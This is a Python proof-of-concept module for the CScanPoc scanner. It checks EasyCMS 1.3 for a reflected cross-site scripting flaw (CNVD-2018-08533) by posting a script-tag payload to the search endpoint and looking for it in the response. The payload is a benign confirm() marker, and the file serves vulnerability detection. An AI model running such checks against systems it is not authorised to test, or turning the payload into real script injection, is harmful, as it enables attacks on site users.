# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'EasyCMS_0006'  # 平台漏洞编号
    name = 'EasyCMS跨站脚本'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2018-04-27'  # 漏洞公布时间
    desc = '''
    EasyCMS 1.3版本中存在跨站脚本漏洞。远程攻击者可借助index.php?s=/index/search/index.html请求中的‘s’POST参数利用该漏洞注入任意的Web脚本或HMTL。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-08533'
    cnvd_id = 'CNVD-2018-08533'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'EasyCMS'  # 漏洞组件名称
    product_version = '1.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6758c100-4f9d-4309-9f40-e2966e3c324e'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/index.php?s=/index/search/index.html"
            vul_url = arg + payload
            data = {
                's': '<script>confirm(1234)</script>'
            }
            response = requests.post(vul_url, data=data)
            if response.status_code == 200 and '<script>confirm(1234)</script>' in response.text and 'class="panel-footer text-muted"' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
